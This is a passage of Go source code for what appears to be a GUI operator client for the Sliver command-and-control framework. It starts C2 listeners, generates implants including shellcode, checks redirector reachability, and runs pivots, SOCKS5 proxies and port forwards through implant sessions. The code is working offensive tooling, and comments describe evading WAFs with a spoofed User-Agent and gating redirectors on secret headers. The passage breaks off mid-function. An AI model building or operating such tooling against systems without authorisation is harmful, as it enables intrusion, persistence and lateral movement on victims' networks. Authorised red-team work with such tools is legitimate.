		_, err = client.RPC.StartHTTPSListener(a.ctx, pbReq)
	} else {
		_, err = client.RPC.StartHTTPListener(a.ctx, pbReq)
	}
	return err
}

type StartDNSReq struct {
	Domains    []string `json:"domains"`
	Canaries   bool     `json:"canaries"`
	Host       string   `json:"host"`
	Port       uint32   `json:"port"`
	EnforceOTP bool     `json:"enforceOTP"`
}

func (a *App) StartDNSListener(req StartDNSReq) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	// Sliver's server matches implant queries against these domains with
	// dns.IsSubDomain, which requires FQDN form (trailing dot). The stock CLI
	// appends "." for the operator; the GUI must do the same, otherwise every
	// DNS beacon is rejected as "not a subdomain of any c2 domain" and no
	// session ever forms.
	domains := make([]string, len(req.Domains))
	for i, d := range req.Domains {
		d = strings.TrimSpace(d)
		if d != "" && !strings.HasSuffix(d, ".") {
			d += "."
		}
		domains[i] = d
	}
	_, err = client.RPC.StartDNSListener(a.ctx, &clientpb.DNSListenerReq{
		Domains:    domains,
		Canaries:   req.Canaries,
		Host:       req.Host,
		Port:       req.Port,
		EnforceOTP: req.EnforceOTP,
	})
	return err
}

type StartWGReq struct {
	Host    string `json:"host"`
	TunIP   string `json:"tunIP"`
	Port    uint32 `json:"port"`
	NPort   uint32 `json:"nPort"`
	KeyPort uint32 `json:"keyPort"`
}

func (a *App) StartWGListener(req StartWGReq) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.StartWGListener(a.ctx, &clientpb.WGListenerReq{
		Host:    req.Host,
		TunIP:   req.TunIP,
		Port:    req.Port,
		NPort:   req.NPort,
		KeyPort: req.KeyPort,
	})
	return err
}

// ─── C2 Profiles ─────────────────────────────────────────────────────────────

type C2ProfileView struct {
	Name string `json:"name"`
}

func (a *App) ListC2Profiles() ([]C2ProfileView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	profiles, err := client.ListHTTPC2Profiles(a.ctx)
	if err != nil {
		return nil, err
	}
	out := make([]C2ProfileView, 0, len(profiles))
	for _, p := range profiles {
		out = append(out, C2ProfileView{Name: p.Name})
	}
	return out, nil
}

// ListenerC2Options returns ready-to-use C2 URLs built from the active listeners,
// so the Generate form can offer a dropdown that auto-fills a valid C2 URL. The
// host is taken from the teamserver address the operator connected to.
func (a *App) ListenerC2Options() ([]string, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.GetJobs(a.ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	host := client.Config.LHost
	out := []string{}
	for _, j := range resp.Active {
		// Job.Protocol is the transport ("tcp"/"udp"); the C2 scheme is in
		// Job.Name ("mtls"/"http"/"https"/"dns"/"wg"). Derive the scheme from the
		// name and skip non-C2 jobs (e.g. the operator/gRPC listener) so we never
		// point an implant at the teamserver's operator port.
		name := strings.ToLower(j.Name)
		var scheme string
		switch {
		case strings.Contains(name, "mtls"):
			scheme = "mtls"
		case strings.Contains(name, "https"):
			scheme = "https"
		case strings.Contains(name, "http"):
			scheme = "http"
		case strings.Contains(name, "dns"):
			scheme = "dns"
		case strings.Contains(name, "wg"), strings.Contains(name, "wireguard"):
			scheme = "wg"
		default:
			continue // not a C2 listener we can build a URL for
		}
		out = append(out, fmt.Sprintf("%s://%s:%d", scheme, host, j.Port))
	}
	return out, nil
}

// ─── Implant Generation ───────────────────────────────────────────────────────

type GenerateRequest struct {
	Name          string `json:"name"`
	GOOS          string `json:"goos"`
	GOARCH        string `json:"goarch"`
	Format        string `json:"format"`
	C2URL         string `json:"c2Url"`
	Debug         bool   `json:"debug"`
	Beacon        bool   `json:"beacon"`   // generate in beacon mode instead of session mode
	Interval      int64  `json:"interval"` // beacon check-in interval, seconds
	Jitter        int64  `json:"jitter"`   // beacon jitter, seconds
	HTTPC2Profile string `json:"httpC2Profile"`
	// Operator-selected HTTP C2 profile name. When set (and the C2 URL scheme is
	// http/https), the built implant uses this profile's URIs, headers, and
	// user-agents instead of the teamserver's default. Empty ⇒ fall back to the
	// legacy behaviour (first profile / "default"). This is how a redirector
	// setup that requires a shared-secret header (e.g. Cloudflare Worker gating
	// on X-Request-ID) actually gets the header baked into the beacon.
}

type GenerateResult struct {
	File  string `json:"file"`
	Name  string `json:"name"`
	Error string `json:"error,omitempty"`
}

// firstHTTPC2ProfileName returns the name of the first HTTP C2 profile the
// teamserver knows about, or "" if there are none. Used to pick a valid
// HTTPC2ConfigName when generating an HTTP(S) implant.
func (a *App) firstHTTPC2ProfileName() (string, error) {
	client, err := a.requireClient()
	if err != nil {
		return "", err
	}
	profiles, err := client.ListHTTPC2Profiles(a.ctx)
	if err != nil {
		return "", err
	}
	// Prefer one literally named "default" if present, else the first.
	for _, p := range profiles {
		if strings.EqualFold(p.Name, "default") {
			return p.Name, nil
		}
	}
	if len(profiles) > 0 {
		return profiles[0].Name, nil
	}
	return "", nil
}

// ListHTTPC2ProfileNames returns just the names of every HTTP C2 profile the
// teamserver knows about - enough to populate the Generate form's profile
// picker without shipping the full HTTPC2Config object across the wire.
func (a *App) ListHTTPC2ProfileNames() ([]string, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	profiles, err := client.ListHTTPC2Profiles(a.ctx)
	if err != nil {
		return nil, err
	}
	names := make([]string, 0, len(profiles))
	for _, p := range profiles {
		if p != nil && p.Name != "" {
			names = append(names, p.Name)
		}
	}
	return names, nil
}

// HTTPC2ProfileSummary is the operator-facing view of an HTTP C2 profile:
// enough to answer "if I pick this profile, what will my beacon send?" without
// dragging the full nested proto through the wire. Purely informational.
type HTTPC2ProfileSummary struct {
	Name             string              `json:"name"`
	UserAgent        string              `json:"userAgent,omitempty"`
	SampleURI        string              `json:"sampleUri,omitempty"`
	URISamples       []string            `json:"uriSamples,omitempty"`
	Headers          []HTTPC2HeaderEntry `json:"headers,omitempty"`
	NonceQueryLength int32               `json:"nonceQueryLength"` // 0 crashes the beacon with secure.Intn: non-positive n
	NonceQueryChars  string              `json:"nonceQueryChars,omitempty"`
	Warnings         []string            `json:"warnings,omitempty"` // human-readable issues the operator should see BEFORE building
}

// HTTPC2HeaderEntry is one header the profile will bake into implant requests.
// Method may be empty when the header applies to all requests.
type HTTPC2HeaderEntry struct {
	Method      string `json:"method,omitempty"`
	Name        string `json:"name"`
	Value       string `json:"value"`
	Probability int32  `json:"probability,omitempty"`
}

// RepairHTTPC2Profile fixes a profile whose nonce configuration would make
// the resulting implants panic on first HTTP request. Sliver's implant
// calls `secure.Intn(NonceQueryLength)` unconditionally - Intn(0) panics.
// This method:
//
//   - Fetches the profile via GetHTTPC2ProfileByName
//   - If NonceQueryLength <= 0, sets it to 16 (safe default)
//   - If NonceQueryArgChars is empty, sets it to lowercase-alphanumeric
//   - Saves the profile back with overwrite=true
//
// Idempotent - running on a healthy profile is a no-op that reports "no
// changes needed". Returns a short description of what changed so the UI
// can toast it.
func (a *App) RepairHTTPC2Profile(name string) (string, error) {
	if strings.TrimSpace(name) == "" {
		return "", fmt.Errorf("profile name required")
	}
	client, err := a.requireClient()
	if err != nil {
		return "", err
	}
	cfg, err := client.GetHTTPC2ProfileByName(a.ctx, name)
	if err != nil {
		return "", err
	}
	if cfg == nil {
		return "", fmt.Errorf("profile %q not found", name)
	}
	if cfg.ImplantConfig == nil {
		return "", fmt.Errorf("profile %q has no ImplantConfig - refusing to guess a full config", name)
	}
	changed := []string{}
	if cfg.ImplantConfig.NonceQueryLength <= 0 {
		cfg.ImplantConfig.NonceQueryLength = 16
		changed = append(changed, "NonceQueryLength=16")
	}
	if strings.TrimSpace(cfg.ImplantConfig.NonceQueryArgChars) == "" {
		cfg.ImplantConfig.NonceQueryArgChars = "abcdefghijklmnopqrstuvwxyz0123456789"
		changed = append(changed, "NonceQueryArgChars=[a-z0-9]")
	}
	if len(changed) == 0 {
		return "no changes needed", nil
	}
	_, err = client.RPC.SaveHTTPC2Profile(a.ctx, &clientpb.HTTPC2ConfigReq{
		Overwrite: true,
		C2Config:  cfg,
	})
	if err != nil {
		return "", fmt.Errorf("save failed: %w", err)
	}
	a.audit.log("repair-httpc2-profile", name, strings.Join(changed, ", "))
	return "fixed: " + strings.Join(changed, ", "), nil
}

// GetHTTPC2ProfileSummary returns a lightweight summary of a single HTTP C2
// profile so the Generate form can display "if you pick this profile, your
// beacon will send X-Request-ID: … from UA … to path /api/v1/status" without
// the operator having to `cat` a JSON file on the server. Read-only.
func (a *App) GetHTTPC2ProfileSummary(name string) (*HTTPC2ProfileSummary, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	cfg, err := client.GetHTTPC2ProfileByName(a.ctx, name)
	if err != nil {
		return nil, err
	}
	if cfg == nil {
		return nil, fmt.Errorf("profile %q not found", name)
	}
	sum := &HTTPC2ProfileSummary{Name: cfg.Name}
	if cfg.ImplantConfig != nil {
		sum.UserAgent = cfg.ImplantConfig.UserAgent
		sum.NonceQueryLength = cfg.ImplantConfig.NonceQueryLength
		sum.NonceQueryChars = cfg.ImplantConfig.NonceQueryArgChars
		if cfg.ImplantConfig.NonceQueryLength <= 0 {
			// Sliver's httpclient.NonceQueryArgument calls secure.Intn(NonceQueryLength).
			// Intn(0) panics inside the implant on first check-in - a broken
			// profile is worse than no profile because it produces a build that
			// crashes on target with no telemetry. Loud warning so the operator
			// picks a different profile.
			sum.Warnings = append(sum.Warnings, "NonceQueryLength=0 - implants built with this profile will panic on first HTTP request (secure.Intn: non-positive n). Fix the profile or pick a different one before generating.")
		}
		if cfg.ImplantConfig.NonceQueryArgChars == "" {
			sum.Warnings = append(sum.Warnings, "NonceQueryArgChars is empty - nonce values will be blank.")
		}
		for _, h := range cfg.ImplantConfig.Headers {
			if h == nil {
				continue
			}
			sum.Headers = append(sum.Headers, HTTPC2HeaderEntry{
				Method:      h.Method,
				Name:        h.Name,
				Value:       h.Value,
				Probability: h.Probability,
			})
		}
		// Show a plausible URI from the profile's path segments so operators
		// recognise what their beacon will POST to. Sliver randomises segments
		// per-request (each is a directory or file candidate); we list the
		// first few Values verbatim, plus a joined example. Never assume more
		// structure than HTTPC2PathSegment{ID, IsFile, Value} exposes.
		if len(cfg.ImplantConfig.PathSegments) > 0 {
			var dirs, files []string
			for _, seg := range cfg.ImplantConfig.PathSegments {
				if seg == nil || seg.Value == "" {
					continue
				}
				if seg.IsFile {
					if len(files) < 3 {
						files = append(files, seg.Value)
					}
				} else {
					if len(dirs) < 3 {
						dirs = append(dirs, seg.Value)
					}
				}
				if len(dirs) >= 3 && len(files) >= 3 {
					break
				}
			}
			var joined []string
			joined = append(joined, dirs...)
			if len(files) > 0 {
				joined = append(joined, files[0])
			}
			if len(joined) > 0 {
				sum.SampleURI = "/" + strings.Join(joined, "/")
			}
			sum.URISamples = append(dirs, files...)
		}
	}
	return sum, nil
}

// TestC2Result captures a single reachability probe of a C2 / redirector URL.
type TestC2Result struct {
	OK          bool              `json:"ok"`
	Status      int               `json:"status"`
	StatusText  string            `json:"statusText"`
	ElapsedMS   int64             `json:"elapsedMs"`
	FinalURL    string            `json:"finalUrl"`
	BodyPreview string            `json:"bodyPreview"`
	Headers     map[string]string `json:"headers,omitempty"`
	Error       string            `json:"error,omitempty"`
	Note        string            `json:"note,omitempty"`
}

// TestC2URL probes a C2 (or redirector) URL from the teamserver-side to
// confirm the beacon path is alive BEFORE the operator waits 30s for a build
// that can't call home. HTTP(S) only - non-HTTP schemes get a friendly Note
// instead of a probe (mtls/dns/wg require real handshakes we can't fake).
//
// Optional headers let the operator pre-flight a redirector header check
// (e.g. `X-Request-ID: <shared secret>`) - the same one their HTTP C2 profile
// will bake into the implant. Runs from the GUI *client* process, so it walks
// the same network path the operator's machine will - including the SSH
// tunnel if the URL points at 127.0.0.1 forwarded to the teamserver.
func (a *App) TestC2URL(urlStr string, headers map[string]string) TestC2Result {
	res := TestC2Result{Headers: map[string]string{}}
	urlStr = strings.TrimSpace(urlStr)
	if urlStr == "" {
		res.Error = "no URL supplied"
		return res
	}
	parsed, err := url.Parse(urlStr)
	if err != nil {
		res.Error = "invalid URL: " + err.Error()
		return res
	}
	scheme := strings.ToLower(parsed.Scheme)
	switch scheme {
	case "http", "https":
		// fall through to the probe
	case "":
		res.Error = "URL has no scheme - use http://, https://, mtls://, etc."
		return res
	default:
		res.Note = fmt.Sprintf("scheme %q can't be HTTP-probed. For mtls/dns/wg/tcp-pivot, verify the listener directly on the teamserver (e.g. `ss -ltnp | grep :port`).", scheme)
		return res
	}

	client := &http.Client{
		Timeout: 8 * time.Second,
		Transport: &http.Transport{
			// Redirector / self-signed certs are the norm in lab setups; skip
			// verification. This is a diagnostic probe, not a data channel.
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			// Follow up to 5 redirects; record the final URL below.
			if len(via) >= 5 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}
	// Fall back to context.Background if the app hasn't been started (e.g.
	// unit tests that construct &App{} directly). NewRequestWithContext panics
	// on a nil ctx, and a nil ctx is not a bug worth crashing the app for.
	ctx := a.ctx
	if ctx == nil {
		ctx = context.Background()
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, urlStr, nil)
	if err != nil {
		res.Error = err.Error()
		return res
	}
	// A modern UA slips past most WAFs that fingerprint the default Go client.
	if _, ok := headers["User-Agent"]; !ok {
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36")
	}
	for k, v := range headers {
		if k = strings.TrimSpace(k); k != "" {
			req.Header.Set(k, v)
		}
	}
	start := time.Now()
	resp, err := client.Do(req)
	res.ElapsedMS = time.Since(start).Milliseconds()
	if err != nil {
		res.Error = err.Error()
		return res
	}
	defer resp.Body.Close()
	res.OK = resp.StatusCode > 0
	res.Status = resp.StatusCode
	res.StatusText = resp.Status
	res.FinalURL = resp.Request.URL.String()
	// Body preview capped at 400 bytes so a full HTML challenge page can't
	// blow up the UI. Enough to spot "Just a moment", "cf-mitigated",
	// "Cloudflare" or a bare cover-response.
	buf := make([]byte, 400)
	n, _ := io.ReadFull(resp.Body, buf)
	res.BodyPreview = strings.ToValidUTF8(string(buf[:n]), "")
	// Surface the handful of response headers that matter for redirector
	// debugging without leaking every session cookie back to the UI.
	for _, k := range []string{"Content-Type", "Content-Length", "Server", "Cf-Ray", "Cf-Cache-Status", "Cf-Mitigated", "X-Cache", "X-Powered-By"} {
		if v := resp.Header.Get(k); v != "" {
			res.Headers[k] = v
		}
	}
	// A couple of read-at-a-glance interpretations for the frontend to render.
	switch {
	case resp.StatusCode == 401 || resp.StatusCode == 403:
		res.Note = "Auth/header check likely failed. If a redirector expects a shared-secret header, add it below and retry."
	case resp.StatusCode == 502 || resp.StatusCode == 503 || resp.StatusCode == 504:
		res.Note = "Redirector reached the origin but origin is down. Check the C2 listener process on the teamserver."
	case resp.StatusCode == 200 || resp.StatusCode == 404:
		res.Note = "Reachable. 404 is often the C2 profile's cover page - expected for a bare probe."
	case resp.StatusCode >= 300 && resp.StatusCode < 400:
		res.Note = "Redirect chain - check FinalURL is what you expect."
	}
	return res
}

// ListenerOption is the richer form of ListenerC2Options, giving the frontend
// enough context to render a useful label ("mtls (Job 2) → 127.0.0.1:8443")
// instead of a bare URL. Kept parallel to ListenerC2Options so old callers
// keep working; new UI should prefer this.
type ListenerOption struct {
	URL     string `json:"url"`
	JobID   uint32 `json:"jobId"`
	JobName string `json:"jobName"`
	Scheme  string `json:"scheme"`
	Host    string `json:"host"`
	Port    uint32 `json:"port"`
	// Label is a pre-formatted "scheme://host:port  (Job N)" the frontend can
	// stick straight into a <option>. The backend builds it so every operator
	// sees the same shape and it never disagrees with URL.
	Label string `json:"label"`
}

// ListenerC2Details returns the same set as ListenerC2Options but with the
// Job metadata attached, so the frontend can render disambiguating labels
// and show which listener a URL belongs to.
func (a *App) ListenerC2Details() ([]ListenerOption, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.GetJobs(a.ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	host := client.Config.LHost
	out := []ListenerOption{}
	for _, j := range resp.Active {
		name := strings.ToLower(j.Name)
		var scheme string
		switch {
		case strings.Contains(name, "mtls"):
			scheme = "mtls"
		case strings.Contains(name, "https"):
			scheme = "https"
		case strings.Contains(name, "http"):
			scheme = "http"
		case strings.Contains(name, "dns"):
			scheme = "dns"
		case strings.Contains(name, "wg"), strings.Contains(name, "wireguard"):
			scheme = "wg"
		default:
			continue
		}
		u := fmt.Sprintf("%s://%s:%d", scheme, host, j.Port)
		out = append(out, ListenerOption{
			URL:     u,
			JobID:   j.ID,
			JobName: j.Name,
			Scheme:  scheme,
			Host:    host,
			Port:    j.Port,
			Label:   fmt.Sprintf("%s  (Job %d)", u, j.ID),
		})
	}
	return out, nil
}

func (a *App) GenerateImplant(req GenerateRequest) GenerateResult {
	client, err := a.requireClient()
	if err != nil {
		return GenerateResult{Error: err.Error()}
	}
	if strings.TrimSpace(req.C2URL) == "" {
		return GenerateResult{Error: "a C2 URL is required (select a listener or enter one)"}
	}
	// Guard against the "beacon panics on first check-in" pit trap: if the
	// chosen HTTP C2 profile has NonceQueryLength <= 0, Sliver's implant
	// crashes with `secure.Intn: non-positive n` before it ever calls home.
	// Refuse the build with an actionable message instead - the operator
	// otherwise gets a silent implant with no telemetry to debug against.
	scheme := strings.ToLower(schemeOf(req.C2URL))
	if scheme == "http" || scheme == "https" {
		effective := strings.TrimSpace(req.HTTPC2Profile)
		if effective == "" {
			effective, _ = a.firstHTTPC2ProfileName()
		}
		if effective != "" {
			if sum, sErr := a.GetHTTPC2ProfileSummary(effective); sErr == nil && sum != nil && sum.NonceQueryLength <= 0 {
				return GenerateResult{Error: fmt.Sprintf(
					"refusing to build: HTTP C2 profile %q has NonceQueryLength=0. Sliver's implant will panic on first check-in with `secure.Intn: non-positive n`. Pick a different profile in the Generate form, or fix the profile on the teamserver (positive NonceQueryLength, non-empty NonceQueryArgChars).",
					effective,
				)}
			}
		}
	}
	cfg := a.buildImplantConfig(req)
	// Build names must be unique in the teamserver DB (UNIQUE constraint on
	// implant_builds.name). If the operator left the name blank, synthesise a
	// unique one so repeated generates never collide.
	autoName := strings.TrimSpace(req.Name) == ""
	name := strings.TrimSpace(req.Name)
	if autoName {
		name = fmt.Sprintf("%s-%s-%s", req.GOOS, req.GOARCH, randSuffix())
	}
	genReq := &clientpb.GenerateReq{
		Name:   name,
		Config: cfg,
	}

	// Generate, retrying with a fresh random name on a UNIQUE-constraint
	// collision (the teamserver keys implant_builds by name). Only auto-retry
	// when the operator didn't supply their own name.
	var resp *clientpb.Generate
	for attempt := 0; attempt < 5; attempt++ {
		resp, err = client.GenerateImplant(a.ctx, genReq)
		if err == nil {
			break
		}
		if !strings.Contains(err.Error(), "UNIQUE constraint") {
			return GenerateResult{Error: err.Error()}
		}
		if !autoName {
			return GenerateResult{Error: fmt.Sprintf("a build named %q already exists - delete it in the Builds panel or choose another name", name)}
		}
		genReq.Name = fmt.Sprintf("%s-%s-%s", req.GOOS, req.GOARCH, randSuffix())
	}
	if err != nil {
		return GenerateResult{Error: "build name keeps colliding after several tries - the teamserver may derive the build name from the config; delete old builds in the Builds panel and retry: " + err.Error()}
	}
	if resp.File == nil {
		return GenerateResult{Error: "server returned an empty build"}
	}
	// The build is now stored on the teamserver. We deliberately do NOT open a
	// save dialog here: doing so blocked this call (and kept the "Building…"
	// spinner up) on a modal dialog that could open behind the window. Instead we
	// return the build name and let the frontend offer "Save to disk", which
	// calls RegenerateBuild(name) on a user click - a dialog raised by a direct
	// gesture gets focus, and the spinner is already gone.
	a.audit.log("generate", genReq.Name, fmt.Sprintf("%s/%s", req.GOOS, req.GOARCH))
	return GenerateResult{Name: genReq.Name, File: genReq.Name}
}

// randSuffix returns 8 random hex chars, used to make auto-generated implant
// names unique so repeated blank-name generates never collide in the DB.
func randSuffix() string {
	b := make([]byte, 4)
	if _, err := rand.Read(b); err != nil {
		// crypto/rand should never fail; fall back to a nanosecond timestamp.
		return fmt.Sprintf("%d", time.Now().UnixNano())
	}
	return hex.EncodeToString(b)
}

// schemeOf returns the URL scheme (the part before "://"), e.g. "mtls" for
// "mtls://host:port". Returns "" if there is no scheme separator.
func schemeOf(url string) string {
	if i := strings.Index(url, "://"); i >= 0 {
		return url[:i]
	}
	return ""
}

func formatFromString(s string) clientpb.OutputFormat {
	switch s {
	case "shared":
		return clientpb.OutputFormat_SHARED_LIB
	case "service":
		return clientpb.OutputFormat_SERVICE
	case "shellcode":
		return clientpb.OutputFormat_SHELLCODE
	default:
		return clientpb.OutputFormat_EXECUTABLE
	}
}

// ─── Pivot Listeners (per-session) ─────────────────────────────────────────────

type PivotView struct {
	ID          string `json:"id"`
	Type        string `json:"type"`
	BindAddress string `json:"bindAddress"`
}

func (a *App) ListPivots(sessionID string) ([]PivotView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.PivotSessionListeners(a.ctx, &sliverpb.PivotListenersReq{
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, err
	}
	out := make([]PivotView, 0, len(resp.Listeners))
	for _, l := range resp.Listeners {
		out = append(out, PivotView{
			ID:          fmt.Sprintf("%d", l.ID),
			Type:        l.Type.String(),
			BindAddress: l.BindAddress,
		})
	}
	return out, nil
}

// StartPivotListener starts a TCP or named-pipe pivot on the implant.
// pivotType: "tcp" or "pipe". bindAddress e.g. "0.0.0.0:9898" (tcp) or a pipe name.
func (a *App) StartPivotListener(sessionID, pivotType, bindAddress string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	pt := sliverpb.PivotType_TCP
	if strings.Contains(strings.ToLower(pivotType), "pipe") {
		pt = sliverpb.PivotType_NamedPipe
	}
	_, err = client.RPC.PivotStartListener(a.ctx, &sliverpb.PivotStartListenerReq{
		Type:        pt,
		BindAddress: bindAddress,
		Request:     &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) StopPivotListener(sessionID string, pivotID uint32) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.PivotStopListener(a.ctx, &sliverpb.PivotStopListenerReq{
		ID:      pivotID,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// ─── SOCKS5 Proxy ──────────────────────────────────────────────────────────────
//
// The Sliver implant runs the actual SOCKS5 server; the client side just relays
// raw TCP bytes over a SocksProxy bidi stream. We open one stream per accepted
// local connection with a unique TunnelID, and copy bytes in both directions.

type socksProxyHandle struct {
	localPort int
	cancel    context.CancelFunc
	listener  net.Listener
}

func (a *App) StartSocksProxy(sessionID string, localPort int) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	a.advMu.Lock()
	if _, ok := a.socks[sessionID]; ok {
		a.advMu.Unlock()
		return fmt.Errorf("a SOCKS5 proxy is already running for this session")
	}
	a.advMu.Unlock()

	ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", localPort))
	if err != nil {
		return fmt.Errorf("listen on 127.0.0.1:%d: %w", localPort, err)
	}
	ctx, cancel := context.WithCancel(a.ctx)
	a.advMu.Lock()
	a.socks[sessionID] = &socksProxyHandle{localPort: localPort, cancel: cancel, listener: ln}
	a.advMu.Unlock()

	go a.runSocks(ctx, client, sessionID, ln)
	return nil
}

func (a *App) StopSocksProxy(sessionID string) error {
	a.advMu.Lock()
	h := a.socks[sessionID]
	delete(a.socks, sessionID)
	a.advMu.Unlock()
	if h == nil {
		return fmt.Errorf("no SOCKS5 proxy running for this session")
	}
	h.listener.Close()
	h.cancel()
	return nil
}

// SocksProxyStatus returns the local port for an active proxy, or 0 if none.
func (a *App) SocksProxyStatus(sessionID string) int {
	a.advMu.Lock()
	defer a.advMu.Unlock()
	if h := a.socks[sessionID]; h != nil {
		return h.localPort
	}
	return 0
}

func (a *App) runSocks(ctx context.Context, client *sliverclient.Client, sessionID string, ln net.Listener) {
	go func() { <-ctx.Done(); ln.Close() }()
	for {
		conn, err := ln.Accept()
		if err != nil {
			return
		}
		go a.socksHandleConn(ctx, client, sessionID, conn)
	}
}

func (a *App) socksHandleConn(ctx context.Context, client *sliverclient.Client, sessionID string, conn net.Conn) {
	defer conn.Close()
	// Register a socks tunnel with the teamserver first so the server can route
	// this stream's frames to the implant's SOCKS server by TunnelID.
	sk, err := client.RPC.CreateSocks(ctx, &sliverpb.Socks{SessionID: sessionID})
	if err != nil {
		return
	}
	tunnelID := sk.TunnelID
	stream, err := client.RPC.SocksProxy(ctx)
	if err != nil {
		return
	}
	defer func() { _, _ = client.RPC.CloseSocks(ctx, &sliverpb.Socks{TunnelID: tunnelID}) }()
	var seq uint64

	// stream -> local conn
	go func() {
		for {
			data, err := stream.Recv()
			if err != nil {
				conn.Close()
				return
			}
			if len(data.Data) > 0 {
				if _, werr := conn.Write(data.Data); werr != nil {
					return
				}
			}
			if data.CloseConn {
				conn.Close()
				return
			}
		}
	}()

	// local conn -> stream
	buf := make([]byte, 4096)
	for {
		n, rerr := conn.Read(buf)
		if n > 0 {
			if serr := stream.Send(&sliverpb.SocksData{
				TunnelID: tunnelID,
				Data:     append([]byte(nil), buf[:n]...),
				Sequence: seq,
				Request:  &commonpb.Request{SessionID: sessionID},
			}); serr != nil {
				break
			}
			seq++
		}
		if rerr != nil {
			break
		}
	}
	_ = stream.Send(&sliverpb.SocksData{
		TunnelID:  tunnelID,
		CloseConn: true,
		Sequence:  seq,
		Request:   &commonpb.Request{SessionID: sessionID},
	})
	_ = stream.CloseSend()
}

// ─── Port Forwarding ───────────────────────────────────────────────────────────
//
// Same raw-relay pattern as SOCKS5, but over the generic Tunnel API. Each local
// connection creates a tunnel and a TunnelData bidi stream, and we copy bytes.
//
// NOTE: the remote target is sent as the first TunnelData frame so the implant
// knows where to dial. Verify this handshake against your sliver v1.7.3 implant
// on-device - if the implant expects the target elsewhere this is the one spot
// to adjust; the byte-relay loop below is protocol-agnostic.

type portfwdHandle struct {
	localPort int
	remote    string
	cancel    context.CancelFunc
	listener  net.Listener
}

type PortForwardView struct {
	LocalPort int    `json:"localPort"`
	Remote    string `json:"remote"`
}

func (a *App) AddPortForward(sessionID string, localPort int, remoteHost string, remotePort int) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	remote := fmt.Sprintf("%s:%d", remoteHost, remotePort)
	ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", localPort))
	if err != nil {
		return fmt.Errorf("listen on 127.0.0.1:%d: %w", localPort, err)
	}
	ctx, cancel := context.WithCancel(a.ctx)
	a.advMu.Lock()
	a.portfwds[sessionID] = append(a.portfwds[sessionID], &portfwdHandle{
		localPort: localPort, remote: remote, cancel: cancel, listener: ln,
	})
	a.advMu.Unlock()

	go a.runPortfwd(ctx, client, sessionID, remote, ln)
	return nil
}

func (a *App) RemovePortForward(sessionID string, localPort int) error {
	a.advMu.Lock()
	defer a.advMu.Unlock()
	list := a.portfwds[sessionID]
	for i, h := range list {
		if h.localPort == localPort {
			h.listener.Close()
			h.cancel()
			a.portfwds[sessionID] = append(list[:i], list[i+1:]...)
			return nil
		}
	}
	return fmt.Errorf("no port forward on local port %d", localPort)
}

func (a *App) ListPortForwards(sessionID string) ([]PortForwardView, error) {
	a.advMu.Lock()
	defer a.advMu.Unlock()
	list := a.portfwds[sessionID]
	out := make([]PortForwardView, 0, len(list))
	for _, h := range list {
		out = append(out, PortForwardView{LocalPort: h.localPort, Remote: h.remote})
	}
	return out, nil
}

func (a *App) runPortfwd(ctx context.Context, client *sliverclient.Client, sessionID, remote string, ln net.Listener) {
	go func() { <-ctx.Done(); ln.Close() }()
	for {
		conn, err := ln.Accept()
		if err != nil {
			return
		}
		go a.portfwdHandleConn(ctx, client, sessionID, remote, conn)
	}
}

func (a *App) portfwdHandleConn(ctx context.Context, client *sliverclient.Client, sessionID, remote string, conn net.Conn) {
	defer conn.Close()
	// Parse the remote address before we create any server-side state so we can
	// reject a bad address early.
	host, portStr, splitErr := net.SplitHostPort(remote)
	if splitErr != nil {
		return
	}
	portNum, portErr := strconv.Atoi(portStr)
	if portErr != nil || portNum <= 0 || portNum > 65535 {
		return
	}
	rpcTunnel, err := client.RPC.CreateTunnel(ctx, &sliverpb.Tunnel{SessionID: sessionID})
	if err != nil {
		return
	}
	tunnelID := rpcTunnel.GetTunnelID()
	stream, err := client.RPC.TunnelData(ctx)
	if err != nil {
		return
	}
	var seq uint64

	// Bind the newly-created tunnel to the stream with an initial empty frame
	// (the implant needs a frame on the stream before it will recognise the
	// TunnelID). Then send the actual PortfwdReq protobuf so the implant knows
	// where to dial - the previous "send remote as raw bytes" approach never
	// triggered the outbound dial, so every forwarded connection hung.
	if err := stream.Send(&sliverpb.TunnelData{TunnelID: tunnelID, Sequence: seq}); err != nil {
		_, _ = client.RPC.CloseTunnel(ctx, &sliverpb.Tunnel{TunnelID: tunnelID, SessionID: sessionID})
		return
	}
	seq++
	portfwdResp, pfErr := client.RPC.Portfwd(ctx, &sliverpb.PortfwdReq{
		Host:      host,
		Port:      uint32(portNum),
		Protocol:  sliverpb.PortFwdProtoTCP,
		TunnelID:  tunnelID,
		KeepAlive: 30,
		Request:   &commonpb.Request{SessionID: sessionID},
	})
	if pfErr != nil {
		_, _ = client.RPC.CloseTunnel(ctx, &sliverpb.Tunnel{TunnelID: tunnelID, SessionID: sessionID})
		return
	}
	if portfwdResp != nil && portfwdResp.Response != nil && portfwdResp.Response.Err != "" {
		_, _ = client.RPC.CloseTunnel(ctx, &sliverpb.Tunnel{TunnelID: tunnelID, SessionID: sessionID})
		return
	}

